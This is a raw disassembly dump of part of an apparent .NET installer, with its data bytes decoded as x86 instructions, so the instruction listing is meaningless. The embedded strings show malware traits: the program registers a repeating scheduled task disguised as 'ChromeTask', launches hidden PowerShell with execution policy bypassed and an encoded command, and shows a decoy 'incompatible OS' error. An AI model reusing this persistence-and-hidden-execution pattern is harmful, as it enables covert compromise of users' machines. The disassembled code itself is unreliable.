  402be9:	00 4e 65             	add    %cl,0x65(%esi)
  402bec:	77 54                	ja     0x402c42
  402bee:	61                   	popa
  402bef:	73 6b                	jae    0x402c5c
  402bf1:	00 55 73             	add    %dl,0x73(%ebp)
  402bf4:	65 72 33             	gs jb  0x402c2a
  402bf7:	32 2e                	xor    (%esi),%ch
  402bf9:	64 6c                	fs insb (%dx),%es:(%edi)
  402bfb:	6c                   	insb   (%dx),%es:(%edi)
  402bfc:	00 50 72             	add    %dl,0x72(%eax)
  402bff:	6f                   	outsl  %ds:(%esi),(%dx)
  402c00:	67 72 61             	addr16 jb 0x402c64
  402c03:	6d                   	insl   (%dx),%es:(%edi)
  402c04:	00 67 65             	add    %ah,0x65(%edi)
  402c07:	74 5f                	je     0x402c68
  402c09:	49                   	dec    %ecx
  402c0a:	74 65                	je     0x402c71
  402c0c:	6d                   	insl   (%dx),%es:(%edi)
  402c0d:	00 53 79             	add    %dl,0x79(%ebx)
  402c10:	73 74                	jae    0x402c86
  402c12:	65 6d                	gs insl (%dx),%es:(%edi)
  402c14:	00 54 69 6d          	add    %dl,0x6d(%ecx,%ebp,2)
  402c18:	65 53                	gs push %ebx
  402c1a:	70 61                	jo     0x402c7d
  402c1c:	6e                   	outsb  %ds:(%esi),(%dx)
  402c1d:	00 4d 61             	add    %cl,0x61(%ebp)
  402c20:	69 6e 00 41 70 70 6c 	imul   $0x6c707041,0x0(%esi),%ebp
  402c27:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402c2e:	00 45 78             	add    %al,0x78(%ebp)
  402c31:	65 63 41 63          	arpl   %eax,%gs:0x63(%ecx)
  402c35:	74 69                	je     0x402ca0
  402c37:	6f                   	outsl  %ds:(%esi),(%dx)
  402c38:	6e                   	outsb  %ds:(%esi),(%dx)
  402c39:	00 53 79             	add    %dl,0x79(%ebx)
  402c3c:	73 74                	jae    0x402cb2
  402c3e:	65 6d                	gs insl (%dx),%es:(%edi)
  402c40:	2e 52                	cs push %edx
  402c42:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402c45:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402c4a:	6e                   	outsb  %ds:(%esi),(%dx)
  402c4b:	00 41 63             	add    %al,0x63(%ecx)
  402c4e:	74 69                	je     0x402cb9
  402c50:	6f                   	outsl  %ds:(%esi),(%dx)
  402c51:	6e                   	outsb  %ds:(%esi),(%dx)
  402c52:	43                   	inc    %ebx
  402c53:	6f                   	outsl  %ds:(%esi),(%dx)
  402c54:	6c                   	insb   (%dx),%es:(%edi)
  402c55:	6c                   	insb   (%dx),%es:(%edi)
  402c56:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402c5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402c5c:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  402c60:	67 67 65 72 43       	addr16 addr16 gs jb 0x402ca8
  402c65:	6f                   	outsl  %ds:(%esi),(%dx)
  402c66:	6c                   	insb   (%dx),%es:(%edi)
  402c67:	6c                   	insb   (%dx),%es:(%edi)
  402c68:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402c6d:	6e                   	outsb  %ds:(%esi),(%dx)
  402c6e:	00 67 65             	add    %ah,0x65(%edi)
  402c71:	74 5f                	je     0x402cd2
  402c73:	44                   	inc    %esp
  402c74:	65 66 69 6e 69 74 69 	imul   $0x6974,%gs:0x69(%esi),%bp
  402c7b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7c:	6e                   	outsb  %ds:(%esi),(%dx)
  402c7d:	00 52 65             	add    %dl,0x65(%edx)
  402c80:	67 69 73 74 65 72 54 	imul   $0x61547265,0x74(%bp,%di),%esi
  402c87:	61 
  402c88:	73 6b                	jae    0x402cf5
  402c8a:	44                   	inc    %esp
  402c8b:	65 66 69 6e 69 74 69 	imul   $0x6974,%gs:0x69(%esi),%bp
  402c92:	6f                   	outsl  %ds:(%esi),(%dx)
  402c93:	6e                   	outsb  %ds:(%esi),(%dx)
  402c94:	00 73 65             	add    %dh,0x65(%ebx)
  402c97:	74 5f                	je     0x402cf8
  402c99:	52                   	push   %edx
  402c9a:	65 70 65             	gs jo  0x402d02
  402c9d:	74 69                	je     0x402d08
  402c9f:	74 69                	je     0x402d0a
  402ca1:	6f                   	outsl  %ds:(%esi),(%dx)
  402ca2:	6e                   	outsb  %ds:(%esi),(%dx)
  402ca3:	00 73 65             	add    %dh,0x65(%ebx)
  402ca6:	74 5f                	je     0x402d07
  402ca8:	44                   	inc    %esp
  402ca9:	65 73 63             	gs jae 0x402d0f
  402cac:	72 69                	jb     0x402d17
  402cae:	70 74                	jo     0x402d24
  402cb0:	69 6f 6e 00 52 65 70 	imul   $0x70655200,0x6e(%edi),%ebp
  402cb7:	65 74 69             	gs je  0x402d23
  402cba:	74 69                	je     0x402d25
  402cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  402cbd:	6e                   	outsb  %ds:(%esi),(%dx)
  402cbe:	50                   	push   %eax
  402cbf:	61                   	popa
  402cc0:	74 74                	je     0x402d36
  402cc2:	65 72 6e             	gs jb  0x402d33
  402cc5:	00 67 65             	add    %ah,0x65(%edi)
  402cc8:	74 5f                	je     0x402d29
  402cca:	52                   	push   %edx
  402ccb:	65 67 69 73 74 72 61 	imul   $0x69746172,%gs:0x74(%bp,%di),%esi
  402cd2:	74 69 
  402cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd5:	6e                   	outsb  %ds:(%esi),(%dx)
  402cd6:	49                   	dec    %ecx
  402cd7:	6e                   	outsb  %ds:(%esi),(%dx)
  402cd8:	66 6f                	outsw  %ds:(%esi),(%dx)
  402cda:	00 54 61 73          	add    %dl,0x73(%ecx,%eiz,2)
  402cde:	6b 52 65 67          	imul   $0x67,0x65(%edx),%edx
  402ce2:	69 73 74 72 61 74 69 	imul   $0x69746172,0x74(%ebx),%esi
  402ce9:	6f                   	outsl  %ds:(%esi),(%dx)
  402cea:	6e                   	outsb  %ds:(%esi),(%dx)
  402ceb:	49                   	dec    %ecx
  402cec:	6e                   	outsb  %ds:(%esi),(%dx)
  402ced:	66 6f                	outsw  %ds:(%esi),(%dx)
  402cef:	00 5a 65             	add    %bl,0x65(%edx)
  402cf2:	72 6f                	jb     0x402d63
  402cf4:	00 43 68             	add    %al,0x68(%ebx)
  402cf7:	61                   	popa
  402cf8:	72 00                	jb     0x402cfa
  402cfa:	54                   	push   %esp
  402cfb:	61                   	popa
  402cfc:	73 6b                	jae    0x402d69
  402cfe:	46                   	inc    %esi
  402cff:	6f                   	outsl  %ds:(%esi),(%dx)
  402d00:	6c                   	insb   (%dx),%es:(%edi)
  402d01:	64 65 72 00          	fs gs jb 0x402d05
  402d05:	67 65 74 5f          	addr16 gs je 0x402d68
  402d09:	52                   	push   %edx
  402d0a:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0b:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0c:	74 46                	je     0x402d54
  402d0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d0f:	6c                   	insb   (%dx),%es:(%edi)
  402d10:	64 65 72 00          	fs gs jb 0x402d14
  402d14:	54                   	push   %esp
  402d15:	69 6d 65 54 72 69 67 	imul   $0x67697254,0x65(%ebp),%ebp
  402d1c:	67 65 72 00          	addr16 gs jb 0x402d20
  402d20:	43                   	inc    %ebx
  402d21:	53                   	push   %ebx
  402d22:	5f                   	pop    %edi
  402d23:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  402d2a:	65 72 00             	gs jb  0x402d2d
  402d2d:	4d                   	dec    %ebp
  402d2e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  402d35:	74 2e                	je     0x402d65
  402d37:	57                   	push   %edi
  402d38:	69 6e 33 32 2e 54 61 	imul   $0x61542e32,0x33(%esi),%ebp
  402d3f:	73 6b                	jae    0x402dac
  402d41:	53                   	push   %ebx
  402d42:	63 68 65             	arpl   %ebp,0x65(%eax)
  402d45:	64 75 6c             	fs jne 0x402db4
  402d48:	65 72 00             	gs jb  0x402d4b
  402d4b:	49                   	dec    %ecx
  402d4c:	45                   	inc    %ebp
  402d4d:	6e                   	outsb  %ds:(%esi),(%dx)
  402d4e:	75 6d                	jne    0x402dbd
  402d50:	65 72 61             	gs jb  0x402db4
  402d53:	74 6f                	je     0x402dc4
  402d55:	72 00                	jb     0x402d57
  402d57:	47                   	inc    %edi
  402d58:	65 74 45             	gs je  0x402da0
  402d5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402d5c:	75 6d                	jne    0x402dcb
  402d5e:	65 72 61             	gs jb  0x402dc2
  402d61:	74 6f                	je     0x402dd2
  402d63:	72 00                	jb     0x402d65
  402d65:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  402d6a:	00 49 6e             	add    %cl,0x6e(%ecx)
  402d6d:	74 50                	je     0x402dbf
  402d6f:	74 72                	je     0x402de3
  402d71:	00 53 79             	add    %dl,0x79(%ebx)
  402d74:	73 74                	jae    0x402dea
  402d76:	65 6d                	gs insl (%dx),%es:(%edi)
  402d78:	2e 44                	cs inc %esp
  402d7a:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402d81:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  402d88:	74 65                	je     0x402def
  402d8a:	6d                   	insl   (%dx),%es:(%edi)
  402d8b:	2e 52                	cs push %edx
  402d8d:	75 6e                	jne    0x402dfd
  402d8f:	74 69                	je     0x402dfa
  402d91:	6d                   	insl   (%dx),%es:(%edi)
  402d92:	65 2e 43             	gs cs inc %ebx
  402d95:	6f                   	outsl  %ds:(%esi),(%dx)
  402d96:	6d                   	insl   (%dx),%es:(%edi)
  402d97:	70 69                	jo     0x402e02
  402d99:	6c                   	insb   (%dx),%es:(%edi)
  402d9a:	65 72 53             	gs jb  0x402df0
  402d9d:	65 72 76             	gs jb  0x402e16
  402da0:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  402da7:	62 75 67             	bound  %esi,0x67(%ebp)
  402daa:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  402db1:	65 
  402db2:	73 00                	jae    0x402db4
  402db4:	41                   	inc    %ecx
  402db5:	64 64 4d             	fs fs dec %ebp
  402db8:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  402dbf:	46                   	inc    %esi
  402dc0:	72 6f                	jb     0x402e31
  402dc2:	6d                   	insl   (%dx),%es:(%edi)
  402dc3:	4d                   	dec    %ebp
  402dc4:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  402dcb:	4e                   	dec    %esi
  402dcc:	75 6c                	jne    0x402e3a
  402dce:	6c                   	insb   (%dx),%es:(%edi)
  402dcf:	61                   	popa
  402dd0:	62 6c 65 46          	bound  %ebp,0x46(%ebp,%eiz,2)
  402dd4:	6c                   	insb   (%dx),%es:(%edi)
  402dd5:	61                   	popa
  402dd6:	67 73 00             	addr16 jae 0x402dd9
  402dd9:	61                   	popa
  402dda:	72 67                	jb     0x402e43
  402ddc:	73 00                	jae    0x402dde
  402dde:	4d                   	dec    %ebp
  402ddf:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  402de6:	74 2e                	je     0x402e16
  402de8:	43                   	inc    %ebx
  402de9:	6f                   	outsl  %ds:(%esi),(%dx)
  402dea:	64 65 41             	fs gs inc %ecx
  402ded:	6e                   	outsb  %ds:(%esi),(%dx)
  402dee:	61                   	popa
  402def:	6c                   	insb   (%dx),%es:(%edi)
  402df0:	79 73                	jns    0x402e65
  402df2:	69 73 00 67 65 74 5f 	imul   $0x5f746567,0x0(%ebx),%esi
  402df9:	41                   	inc    %ecx
  402dfa:	6c                   	insb   (%dx),%es:(%edi)
  402dfb:	6c                   	insb   (%dx),%es:(%edi)
  402dfc:	54                   	push   %esp
  402dfd:	61                   	popa
  402dfe:	73 6b                	jae    0x402e6b
  402e00:	73 00                	jae    0x402e02
  402e02:	43                   	inc    %ebx
  402e03:	6f                   	outsl  %ds:(%esi),(%dx)
  402e04:	6e                   	outsb  %ds:(%esi),(%dx)
  402e05:	74 61                	je     0x402e68
  402e07:	69 6e 73 00 67 65 74 	imul   $0x74656700,0x73(%esi),%ebp
  402e0e:	5f                   	pop    %edi
  402e0f:	41                   	inc    %ecx
  402e10:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  402e14:	6e                   	outsb  %ds:(%esi),(%dx)
  402e15:	73 00                	jae    0x402e17
  402e17:	53                   	push   %ebx
  402e18:	79 73                	jns    0x402e8d
  402e1a:	74 65                	je     0x402e81
  402e1c:	6d                   	insl   (%dx),%es:(%edi)
  402e1d:	2e 43                	cs inc %ebx
  402e1f:	6f                   	outsl  %ds:(%esi),(%dx)
  402e20:	6c                   	insb   (%dx),%es:(%edi)
  402e21:	6c                   	insb   (%dx),%es:(%edi)
  402e22:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402e27:	6e                   	outsb  %ds:(%esi),(%dx)
  402e28:	73 00                	jae    0x402e2a
  402e2a:	67 65 74 5f          	addr16 gs je 0x402e8d
  402e2e:	43                   	inc    %ebx
  402e2f:	68 61 72 73 00       	push   $0x737261
  402e34:	67 65 74 5f          	addr16 gs je 0x402e97
  402e38:	54                   	push   %esp
  402e39:	72 69                	jb     0x402ea4
  402e3b:	67 67 65 72 73       	addr16 addr16 gs jb 0x402eb3
  402e40:	00 41 74             	add    %al,0x74(%ecx)
  402e43:	74 72                	je     0x402eb7
  402e45:	69 62 75 74 65 54 61 	imul   $0x61546574,0x75(%edx),%esp
  402e4c:	72 67                	jb     0x402eb5
  402e4e:	65 74 73             	gs je  0x402ec4
  402e51:	00 43 6f             	add    %al,0x6f(%ebx)
  402e54:	6e                   	outsb  %ds:(%esi),(%dx)
  402e55:	63 61 74             	arpl   %esp,0x74(%ecx)
  402e58:	00 4f 62             	add    %cl,0x62(%edi)
  402e5b:	6a 65                	push   $0x65
  402e5d:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
  402e61:	70 5f                	jo     0x402ec2
  402e63:	45                   	inc    %ebp
  402e64:	78 70                	js     0x402ed6
  402e66:	6c                   	insb   (%dx),%es:(%edi)
  402e67:	69 63 69 74 00 45 78 	imul   $0x78450074,0x69(%ebx),%esp
  402e6e:	69 74 00 45 6e 76 69 	imul   $0x7269766e,0x45(%eax,%eax,1),%esi
  402e75:	72 
  402e76:	6f                   	outsl  %ds:(%esi),(%dx)
  402e77:	6e                   	outsb  %ds:(%esi),(%dx)
  402e78:	6d                   	insl   (%dx),%es:(%edi)
  402e79:	65 6e                	outsb  %gs:(%esi),(%dx)
  402e7b:	74 00                	je     0x402e7d
  402e7d:	67 65 74 5f          	addr16 gs je 0x402ee0
  402e81:	43                   	inc    %ebx
  402e82:	75 72                	jne    0x402ef6
  402e84:	72 65                	jb     0x402eeb
  402e86:	6e                   	outsb  %ds:(%esi),(%dx)
  402e87:	74 00                	je     0x402e89
  402e89:	4d                   	dec    %ebp
  402e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8b:	76 65                	jbe    0x402ef2
  402e8d:	4e                   	dec    %esi
  402e8e:	65 78 74             	gs js  0x402f05
  402e91:	00 52 65             	add    %dl,0x65(%edx)
  402e94:	61                   	popa
  402e95:	64 41                	fs inc %ecx
  402e97:	6c                   	insb   (%dx),%es:(%edi)
  402e98:	6c                   	insb   (%dx),%es:(%edi)
  402e99:	54                   	push   %esp
  402e9a:	65 78 74             	gs js  0x402f11
  402e9d:	00 67 65             	add    %ah,0x65(%edi)
  402ea0:	74 5f                	je     0x402f01
  402ea2:	4e                   	dec    %esi
  402ea3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea4:	77 00                	ja     0x402ea6
  402ea6:	4d                   	dec    %ebp
  402ea7:	65 73 73             	gs jae 0x402f1d
  402eaa:	61                   	popa
  402eab:	67 65 42             	addr16 gs inc %edx
  402eae:	6f                   	outsl  %ds:(%esi),(%dx)
  402eaf:	78 00                	js     0x402eb1
  402eb1:	43                   	inc    %ebx
  402eb2:	6f                   	outsl  %ds:(%esi),(%dx)
  402eb3:	6e                   	outsb  %ds:(%esi),(%dx)
  402eb4:	74 61                	je     0x402f17
  402eb6:	69 6e 73 4b 65 79 00 	imul   $0x79654b,0x73(%esi),%ebp
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 00                	add    %al,(%eax)
  402ec1:	01 00                	add    %eax,(%eax)
  402ec3:	13 5f 00             	adc    0x0(%edi),%ebx
  402ec6:	6d                   	insl   (%dx),%es:(%edi)
  402ec7:	00 65 00             	add    %ah,0x0(%ebp)
  402eca:	74 00                	je     0x402ecc
  402ecc:	61                   	popa
  402ecd:	00 2e                	add    %ch,(%esi)
  402ecf:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  402ed3:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  402ed7:	2d 45 00 72 00       	sub    $0x720045,%eax
  402edc:	72 00                	jb     0x402ede
  402ede:	6f                   	outsl  %ds:(%esi),(%dx)
  402edf:	00 72 00             	add    %dh,0x0(%edx)
  402ee2:	2c 00                	sub    $0x0,%al
  402ee4:	20 00                	and    %al,(%eax)
  402ee6:	69 00 6e 00 63 00    	imul   $0x63006e,(%eax),%eax
  402eec:	6f                   	outsl  %ds:(%esi),(%dx)
  402eed:	00 6d 00             	add    %ch,0x0(%ebp)
  402ef0:	70 00                	jo     0x402ef2
  402ef2:	61                   	popa
  402ef3:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  402ef7:	00 62 00             	add    %ah,0x0(%edx)
  402efa:	6c                   	insb   (%dx),%es:(%edi)
  402efb:	00 65 00             	add    %ah,0x0(%ebp)
  402efe:	20 00                	and    %al,(%eax)
  402f00:	4f                   	dec    %edi
  402f01:	00 53 00             	add    %dl,0x0(%ebx)
  402f04:	00 0b                	add    %cl,(%ebx)
  402f06:	45                   	inc    %ebp
  402f07:	00 72 00             	add    %dh,0x0(%edx)
  402f0a:	72 00                	jb     0x402f0c
  402f0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402f0d:	00 72 00             	add    %dh,0x0(%edx)
  402f10:	00 73 70             	add    %dh,0x70(%ebx)
  402f13:	00 6f 00             	add    %ch,0x0(%edi)
  402f16:	77 00                	ja     0x402f18
  402f18:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402f1c:	73 00                	jae    0x402f1e
  402f1e:	68 00 65 00 6c       	push   $0x6c006500
  402f23:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  402f27:	00 2d 00 45 00 78    	add    %ch,0x78004500
  402f2d:	00 65 00             	add    %ah,0x0(%ebp)
  402f30:	63 00                	arpl   %eax,(%eax)
  402f32:	75 00                	jne    0x402f34
  402f34:	74 00                	je     0x402f36
  402f36:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  402f3c:	50                   	push   %eax
  402f3d:	00 6f 00             	add    %ch,0x0(%edi)
  402f40:	6c                   	insb   (%dx),%es:(%edi)
  402f41:	00 69 00             	add    %ch,0x0(%ecx)
  402f44:	63 00                	arpl   %eax,(%eax)
  402f46:	79 00                	jns    0x402f48
  402f48:	20 00                	and    %al,(%eax)
  402f4a:	42                   	inc    %edx
  402f4b:	00 79 00             	add    %bh,0x0(%ecx)
  402f4e:	70 00                	jo     0x402f50
  402f50:	61                   	popa
  402f51:	00 73 00             	add    %dh,0x0(%ebx)
  402f54:	73 00                	jae    0x402f56
  402f56:	20 00                	and    %al,(%eax)
  402f58:	2d 00 57 00 69       	sub    $0x69005700,%eax
  402f5d:	00 6e 00             	add    %ch,0x0(%esi)
  402f60:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  402f64:	77 00                	ja     0x402f66
  402f66:	53                   	push   %ebx
  402f67:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  402f6b:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  402f6f:	00 20                	add    %ah,(%eax)
  402f71:	00 48 00             	add    %cl,0x0(%eax)
  402f74:	69 00 64 00 64 00    	imul   $0x640064,(%eax),%eax
  402f7a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  402f7e:	20 00                	and    %al,(%eax)
  402f80:	2d 00 45 00 01       	sub    $0x1004500,%eax
  402f85:	19 45 00             	sbb    %eax,0x0(%ebp)
  402f88:	78 00                	js     0x402f8a
  402f8a:	61                   	popa
  402f8b:	00 6d 00             	add    %ch,0x0(%ebp)
  402f8e:	70 00                	jo     0x402f90
  402f90:	6c                   	insb   (%dx),%es:(%edi)
  402f91:	00 65 00             	add    %ah,0x0(%ebp)
  402f94:	20 00                	and    %al,(%eax)
  402f96:	74 00                	je     0x402f98
  402f98:	61                   	popa
  402f99:	00 73 00             	add    %dh,0x0(%ebx)
  402f9c:	6b 00 00             	imul   $0x0,(%eax),%eax
  402f9f:	07                   	pop    %es
  402fa0:	63 00                	arpl   %eax,(%eax)
  402fa2:	6d                   	insl   (%dx),%es:(%edi)
  402fa3:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  402fa7:	80 97 2f 00 63 00 20 	adcb   $0x20,0x63002f(%edi)
  402fae:	00 73 00             	add    %dh,0x0(%ebx)
  402fb1:	74 00                	je     0x402fb3
  402fb3:	61                   	popa
  402fb4:	00 72 00             	add    %dh,0x0(%edx)
  402fb7:	74 00                	je     0x402fb9
  402fb9:	20 00                	and    %al,(%eax)
  402fbb:	2f                   	das
  402fbc:	00 6d 00             	add    %ch,0x0(%ebp)
  402fbf:	69 00 6e 00 20 00    	imul   $0x20006e,(%eax),%eax
  402fc5:	22 00                	and    (%eax),%al
  402fc7:	22 00                	and    (%eax),%al
  402fc9:	20 00                	and    %al,(%eax)
  402fcb:	70 00                	jo     0x402fcd
  402fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  402fce:	00 77 00             	add    %dh,0x0(%edi)
  402fd1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402fd5:	73 00                	jae    0x402fd7
  402fd7:	68 00 65 00 6c       	push   $0x6c006500
  402fdc:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  402fe0:	00 2d 00 45 00 78    	add    %ch,0x78004500
  402fe6:	00 65 00             	add    %ah,0x0(%ebp)
  402fe9:	63 00                	arpl   %eax,(%eax)
  402feb:	75 00                	jne    0x402fed
  402fed:	74 00                	je     0x402fef
  402fef:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  402ff5:	50                   	push   %eax
  402ff6:	00 6f 00             	add    %ch,0x0(%edi)
  402ff9:	6c                   	insb   (%dx),%es:(%edi)
  402ffa:	00 69 00             	add    %ch,0x0(%ecx)
  402ffd:	63 00                	arpl   %eax,(%eax)
  402fff:	79 00                	jns    0x403001
  403001:	20 00                	and    %al,(%eax)
  403003:	42                   	inc    %edx
  403004:	00 79 00             	add    %bh,0x0(%ecx)
  403007:	70 00                	jo     0x403009
  403009:	61                   	popa
  40300a:	00 73 00             	add    %dh,0x0(%ebx)
  40300d:	73 00                	jae    0x40300f
  40300f:	20 00                	and    %al,(%eax)
  403011:	2d 00 57 00 69       	sub    $0x69005700,%eax
  403016:	00 6e 00             	add    %ch,0x0(%esi)
  403019:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40301d:	77 00                	ja     0x40301f
  40301f:	53                   	push   %ebx
  403020:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  403024:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  403028:	00 20                	add    %ah,(%eax)
  40302a:	00 48 00             	add    %cl,0x0(%eax)
  40302d:	69 00 64 00 64 00    	imul   $0x640064,(%eax),%eax
  403033:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403037:	20 00                	and    %al,(%eax)
  403039:	2d 00 45 00 20       	sub    $0x20004500,%eax
  40303e:	00 01                	add    %al,(%ecx)
  403040:	15 43 00 68 00       	adc    $0x680043,%eax
  403045:	72 00                	jb     0x403047
  403047:	6f                   	outsl  %ds:(%esi),(%dx)
  403048:	00 6d 00             	add    %ch,0x0(%ebp)
  40304b:	65 00 54 00 61       	add    %dl,%gs:0x61(%eax,%eax,1)
  403050:	00 73 00             	add    %dh,0x0(%ebx)
  403053:	6b 00 00             	imul   $0x0,(%eax),%eax
  403056:	00 00                	add    %al,(%eax)
  403058:	44                   	inc    %esp
  403059:	f7 02 c5 c6 0b 6b    	testl  $0x6b0bc6c5,(%edx)
  40305f:	42                   	inc    %edx
  403060:	92                   	xchg   %eax,%edx
  403061:	f2 48                	repnz dec %eax
  403063:	3d 7f ed de ee       	cmp    $0xeedeed7f,%eax
  403068:	00 04 20             	add    %al,(%eax,%eiz,1)
  40306b:	01 01                	add    %eax,(%ecx)
  40306d:	08 03                	or     %al,(%ebx)
  40306f:	20 00                	and    %al,(%eax)
  403071:	01 05 20 01 01 11    	add    %eax,0x11010120
  403077:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40307a:	01 01                	add    %eax,(%ecx)
  40307c:	0e                   	push   %cs
  40307d:	05 20 01 01 11       	add    $0x11010120,%eax
  403082:	39 0d 07 06 0e 15    	cmp    %ecx,0x150e0607
  403088:	12 45 02             	adc    0x2(%ebp),%al
  40308b:	03 03                	add    (%ebx),%eax
  40308d:	0e                   	push   %cs
  40308e:	08 03                	or     %al,(%ebx)
  403090:	03 06                	add    (%esi),%eax
  403092:	15 12 45 02 03       	adc    $0x3024512,%eax
  403097:	03 07                	add    (%edi),%eax
  403099:	20 02                	and    %al,(%edx)
  40309b:	01 13                	add    %edx,(%ebx)
  40309d:	00 13                	add    %dl,(%ebx)
  40309f:	01 04 00             	add    %eax,(%eax,%eax,1)
  4030a2:	01 0e                	add    %ecx,(%esi)
  4030a4:	0e                   	push   %cs
  4030a5:	04 20                	add    $0x20,%al
  4030a7:	01 03                	add    %eax,(%ebx)
  4030a9:	08 05 20 01 02 13    	or     %al,0x13020120
  4030af:	00 06                	add    %al,(%esi)
  4030b1:	20 01                	and    %al,(%ecx)
  4030b3:	13 01                	adc    (%ecx),%eax
  4030b5:	13 00                	adc    (%eax),%eax
  4030b7:	03 20                	add    (%eax),%esp
  4030b9:	00 0e                	add    %cl,(%esi)
  4030bb:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  4030c0:	0e                   	push   %cs
  4030c1:	03 20                	add    (%eax),%esp
  4030c3:	00 08                	add    %cl,(%eax)
  4030c5:	10 07                	adc    %al,(%edi)
  4030c7:	06                   	push   %es
  4030c8:	12 49 12             	adc    0x12(%ecx),%cl
  4030cb:	4d                   	dec    %ebp
  4030cc:	0e                   	push   %cs
  4030cd:	0e                   	push   %cs
  4030ce:	15 12 51 01 12       	adc    $0x12015112,%eax
  4030d3:	55                   	push   %ebp
  4030d4:	11 59 04             	adc    %ebx,0x4(%ecx)
  4030d7:	00 01                	add    %al,(%ecx)
  4030d9:	18 08                	sbb    %cl,(%eax)
  4030db:	04 00                	add    $0x0,%al
  4030dd:	01 01                	add    %eax,(%ecx)
  4030df:	08 08                	or     %cl,(%eax)
  4030e1:	20 00                	and    %al,(%eax)
  4030e3:	15 12 75 01 12       	adc    $0x12017512,%eax
  4030e8:	55                   	push   %ebp
  4030e9:	06                   	push   %es
  4030ea:	15 12 75 01 12       	adc    $0x12017512,%eax
  4030ef:	55                   	push   %ebp
  4030f0:	08 20                	or     %ah,(%eax)
  4030f2:	00 15 12 51 01 13    	add    %dl,0x13015112
  4030f8:	00 06                	add    %al,(%esi)
  4030fa:	15 12 51 01 12       	adc    $0x12015112,%eax
  4030ff:	55                   	push   %ebp
  403100:	04 20                	add    $0x20,%al
  403102:	00 13                	add    %dl,(%ebx)
  403104:	00 04 20             	add    %al,(%eax,%eiz,1)
  403107:	00 12                	add    %dl,(%edx)
  403109:	4d                   	dec    %ebp
  40310a:	04 20                	add    $0x20,%al
  40310c:	00 12                	add    %dl,(%edx)
  40310e:	79 05                	jns    0x403115
  403110:	20 01                	and    %al,(%ecx)
  403112:	12 7d 08             	adc    0x8(%ebp),%bh
  403115:	04 20                	add    $0x20,%al
  403117:	01 02                	add    %eax,(%edx)
  403119:	0e                   	push   %cs
  40311a:	03 20                	add    (%eax),%esp
  40311c:	00 02                	add    %al,(%edx)
  40311e:	05 20 00 12 80       	add    $0x80120020,%eax
  403123:	89 05 20 00 12 80    	mov    %eax,0x80120020
  403129:	8d 04 00             	lea    (%eax,%eax,1),%eax
  40312c:	00 11                	add    %dl,(%ecx)
  40312e:	59                   	pop    %ecx
  40312f:	05 20 01 11 59       	add    $0x59110120,%eax
  403134:	0d 05 20 01 01       	or     $0x1012005,%eax
  403139:	11 59 06             	adc    %ebx,0x6(%ecx)
  40313c:	00 01                	add    %al,(%ecx)
  40313e:	11 80 95 0d 04 06    	adc    %eax,0x6040d95(%eax)
  403144:	11 80 95 0a 20 03    	adc    %eax,0x3200a95(%eax)
  40314a:	01 11                	add    %edx,(%ecx)
  40314c:	80 95 11 80 95 02 06 	adcb   $0x6,0x2958011(%ebp)
  403153:	20 01                	and    %al,(%ecx)
  403155:	01 12                	add    %edx,(%edx)
  403157:	80 99 07 30 01 01 1e 	sbbb   $0x1e,0x1013007(%ecx)
  40315e:	00 1e                	add    %bl,(%esi)
  403160:	00 05 0a 01 12 80    	add    %al,0x8012010a
  403166:	91                   	xchg   %eax,%ecx
  403167:	06                   	push   %es
